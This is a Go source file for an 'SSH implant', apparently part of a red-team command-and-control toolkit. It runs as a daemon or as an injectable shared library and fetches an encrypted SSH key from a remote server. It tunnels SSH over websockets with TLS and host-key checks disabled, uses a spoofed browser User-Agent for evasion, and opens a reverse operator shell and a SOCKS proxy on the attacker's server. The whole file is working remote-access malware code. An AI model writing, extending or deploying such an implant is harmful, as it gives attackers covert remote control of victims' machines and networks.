/*
	SSH implant
*/

package main

import (
	"C"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/crypto/ssh"
)

// For buildmode shared
// export as `entry`

//export entry
func entry() int {
	main()
	return 0
}

func main() {

	if len(os.Args) != 2 {
		fmt.Printf("FYI: Use %s [start|stop] but OK... \n ", os.Args[0])
	}

	if LogFile != "" {
		flog, err := os.OpenFile(LogFile,
			os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			log.Println(err)
		}
		defer flog.Close()

		log.SetOutput(flog)
	}

	if Daemonize == strings.ToLower("yes") {

		if len(os.Args) == 1 || strings.ToLower(os.Args[1]) == "start" {

			// check if daemon already running.
			if _, err := os.Stat(PIDFile); err == nil {
				log.Println("Implant: Already running or pid file exist.")
				os.Exit(1)
			}

			cmd := exec.Command(os.Args[0], "run")
			cmd.Start()
			log.Printf("Implant: Daemon process %s, PID %d\n", os.Args[0], cmd.Process.Pid)

			savePID(cmd.Process.Pid)
			time.Sleep(1)
			os.Exit(0)

		}

		if strings.ToLower(os.Args[1]) == "run" {

			// Make arrangement to remove PID file upon receiving the SIGTERM from kill command
			ch := make(chan os.Signal, 1)
			signal.Notify(ch, os.Interrupt, os.Kill, syscall.SIGTERM)

			go func() {
				signalType := <-ch
				signal.Stop(ch)
				log.Println("Implant: Exit command received. Exiting...")

				// this is a good place to flush everything to disk
				// before terminating.
				log.Println("Implant Received signal type : ", signalType)

				// remove PID file
				os.Remove(PIDFile)
				os.Exit(0)

			}()

			doit()
		}

		// upon receiving the stop command
		// read the Process ID stored in PIDfile
		// kill the process using the Process ID
		// and exit. If Process ID does not exist, prompt error and quit

		if strings.ToLower(os.Args[1]) == "stop" {
			if _, err := os.Stat(PIDFile); err == nil {
				data, err := ioutil.ReadFile(PIDFile)
				if err != nil {
					log.Println("Implant: Daemon Not running")
					os.Exit(1)
				}
				ProcessID, err := strconv.Atoi(string(data))

				if err != nil {
					log.Println("Implant: Unable to read and parse process id found in ", PIDFile)
					os.Exit(1)
				}

				process, err := os.FindProcess(ProcessID)

				if err != nil {
					log.Printf("Implant: Unable to find process ID [%v] with error %v \n", ProcessID, err)
					os.Exit(1)
				}
				// remove PID file
				os.Remove(PIDFile)

				log.Printf("Implant: Killing process ID [%v] now.\n", ProcessID)
				// kill process and exit immediately
				err = process.Kill()

				if err != nil {
					log.Printf("Implant: Unable to kill process ID [%v] with error %v \n", ProcessID, err)
					os.Exit(1)
				} else {
					log.Printf("Implant: Killed process ID [%v]\n", ProcessID)
					os.Exit(0)
				}

			} else {
				log.Println("Implant: Daemon Not running.")
				os.Exit(1)
			}
		} else {
			log.Printf("Implant: Unknown command : %v\n", os.Args[1])
			log.Printf("Usage : %s [start|stop]\n", os.Args[0])
			os.Exit(1)
		}
	} else {
		doit()
	}
}

// getSSHKeyHTTP fetches SSH private key from external server
func getSSHKeyHTTP() ([]byte, error) {

	// TODO: Implement backoff: https://github.com/jpillora/backoff
	resp, err := http.Get(SSHServerUserKeyUrl)
	if err != nil {
		log.Println("Implant: Key Server not accessible or file not found")
		return nil, err
	}
	defer resp.Body.Close()

	eKeyBytesA, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Println("Implant: Key Server response not understood")
		return nil, err // TODO: Should not exit, instead try to remediate within backoff or return error
	}

	eKeyBytes, err := b64ToBytes(string(eKeyBytesA[:]))
	if err != nil {
		log.Println("Implant: Base64 key decode error:", err)
		return nil, err
	}
	return eKeyBytes, nil
}

func b64ToBytes(b64 string) ([]byte, error) {
	// Local unwrap
	eKeyBytes, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		log.Println("Implant: Base64 key decode error:", err)
		return nil, err
	}
	return eKeyBytes, nil
}

func doit() {

	var (
		eKeyBytes []byte
		err       error
		httpProxyURL *url.URL
	)

	runtime.GOMAXPROCS(runtime.NumCPU())

	if SSHServerUserKey != "" {
		eKeyBytes, err = b64ToBytes(SSHServerUserKey)
	} else {
		// Remote fetch
		eKeyBytes, err = getSSHKeyHTTP()
		if err != nil {
			log.Println("Implant: Unable to proceed as SSH key not fetched")
		}
	}
	// Various SSH servers have different formats for SSH keys. They also change at will.
	// To avoid variations in (armored) SSH key, we generate our own pure RSA key irrespective of the
	// destination SSH server, with a passphrase. This is a passphrase to unwrap the key.
	key := KeyDecrypt(eKeyBytes, SSHServerUserKeyPassphrase)

	signer, err := ssh.ParsePrivateKey(key)
	if err != nil {
		log.Fatalf("Implant: Unable to parse private key: %v", err)
	}

	// Setup authentication with the private key
	sshConfig := &ssh.ClientConfig{
		// SSH connection username
		User: SSHServerUser,
		Auth: []ssh.AuthMethod{
			ssh.PublicKeys(signer),
		},

		// TODO: Improve with option to validating a static Host key
		// HostKeyCallback: ssh.FixedHostKey(hostKey),
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	// Client side:
	// <-> Likely where websocket base network is plugged in

	// TODO: improve by giving option to validate instead of InsecureSkipVerify
	tlsClient := tls.Config{InsecureSkipVerify: true}
	d := websocket.Dialer{
		//ReadBufferSize:  1024,
		//WriteBufferSize: 1024,
		HandshakeTimeout: 45 * time.Second,
		Subprotocols:     []string{},
		TLSClientConfig:  &tlsClient,
	}
	// Dialer options. Experimental, set by flag
	// TODO: config variable
	d.EnableCompression = true


	// TODO: Introduce proxy options:
	// build the websocket dialer with proxy information like credentials

	// q. Use known HTTP proxy outbound
	if HTTPProxy != "" {

		// Proxy specifies a function to return a proxy for a given
		// Request. If the function returns a non-nil error, the
		// request is aborted with the provided error.
		// If Proxy is nil or returns a nil *URL, no proxy is used.
		d.Proxy = func(*http.Request) (*url.URL, error) {

			httpProxyURL, err = url.Parse(HTTPProxy)
			if err != nil {
				return nil, err
			}

			if HTTPProxyAuthUser != "" && HTTPProxyAuthPass != "" {
				httpProxyURL.User = url.UserPassword(HTTPProxyAuthUser, HTTPProxyAuthPass)
			}
			return httpProxyURL, nil
		}
		log.Println("HTTP:WS: Explicit proxy set")
	}

	// b. Get proxy from environment
	if HTTPProxyFromEnvironment == strings.ToLower("yes") {
		d.Proxy = http.ProxyFromEnvironment
		log.Println("HTTP:WS: Environment proxy set")
	}

	/* HTTP endpoint */
	// TODO: Improve logic to differentiate WSS/WS
	httpEndpoint, err := url.Parse(HTTPEndpoint)
	if err != nil {
		log.Fatal(err)
	}

	// Evasion by initial HTTP Traffic flexibility. Profiles.
	// TODO: Refactor HTTP Evasion
	// cookies
	jar, _ := cookiejar.New(nil)
	d.Jar = jar
	cookies := []*http.Cookie{{Name: "gorilla", Value: "ws", Path: "/"}}
	d.Jar.SetCookies(httpEndpoint, cookies)

	// Setup wss evasion params
	// TODO: Research how this can be used
	data := url.Values{}
	data.Add("name", "foo")
	data.Add("surname", "bar")
	/* End HTTP Endpoint */

	// Setup Queries (randomize /stream resource)
	// TODO: Why data is not seen?
	wssReqURL := WSEndpoint
	wssReq, _ := http.NewRequest("GET", wssReqURL, strings.NewReader(data.Encode()))
	wssReq.Form = data

	// Setup headers
	wssReq.Header.Set("User-Agent",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 1.5; rv:42.0) Gecko/20170101 Firefox/42.0")

	// TODO: test auth: https://github.com/gorilla/websocket/blob/master/client_server_test.go
	wsConn, resp, err := d.Dial(wssReqURL, wssReq.Header)

	// TODO: Backoff?
	if err != nil {
		log.Printf("HTTP:WS: WS-Dial INTO remote server error: %s", err)
		if err == websocket.ErrBadHandshake {
			log.Printf("HTTP:WS: Response Status: %s", resp.Status)
			log.Fatalln(fmt.Printf("HTTP:WS: handshake failed with status %d\n", resp.StatusCode))
		}
	}

	// Implant side
	// Wrap SSH into WS
	conn := NewWebSocketConn(wsConn)

	sshConn, chans, reqs, err := ssh.NewClientConn(
		conn, SSHServerHost+":"+SSHServerPort, sshConfig)
	serverConn := ssh.NewClient(sshConn, chans, reqs)

	/* This is not needed as we are armorizing the tunnel
	serverConn, err = ssh.Dial("tcp", serverEndpoint.String(), sshConfig)
	*/

	// Server (Red) side:
	// Listen on remote server port - SSH Shell, command, Subsystems
	listener, err := serverConn.Listen("tcp", SSHRemoteEndpoint.String())
	if err != nil {
		log.Fatalln(fmt.Printf("SSH: Listen open port ON SSHRemoteEndpoint error: %s", err))
	}
	defer listener.Close()

	// Server (Red) side:
	// Listen on remote server port - SOCKS
	listenerS, err := serverConn.Listen("tcp", SSHRemoteEndpointSOCKS.String())
	if err != nil {
		log.Fatalln(fmt.Printf("SSH: Listen open port ON SSHRemoteEndpointSOCKS error: %s", err))
	}
	defer listenerS.Close()

	// Server (Red) side:
	// Setup reverse SSH client authentication
	config := &ssh.ServerConfig{
		// Provide an additional level of protection for remote SSH shell
		// Operators have to provide a password to connect to the SSH implant tunnel randezvous
		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			if c.User() == SSHRemoteCmdUser && string(pass) == SSHRemoteCmdPwd {
				return nil, nil
			}
			return nil, fmt.Errorf("SSH: RTO password (SSHRemoteCmdPwd) rejected for %q", c.User())
		},
		// TODO: Implement Key-based auth for the operators
		// See: https://go.googlesource.com/crypto/+/master/ssh/client_auth_test.go
	}

	// use the same private key to come back to the implant
	config.AddHostKey(signer)

	// accept SOCKS listener
	go acceptSLoop(listenerS)
	// accept SSH shell
	acceptLoop(listener, config)
}



// savePID saves daemon PID to file
func savePID(pid int) {

	file, err := os.Create(PIDFile)
	if err != nil {
		log.Printf("Implant: Daemon Unable to create pid file : %v\n", err)
	}

	defer file.Close()

	_, err = file.WriteString(strconv.Itoa(pid))
	if err != nil {
		log.Printf("Implant: Daemon Unable to create pid file : %v\n", err)
	}

	file.Sync() // flush to disk
}
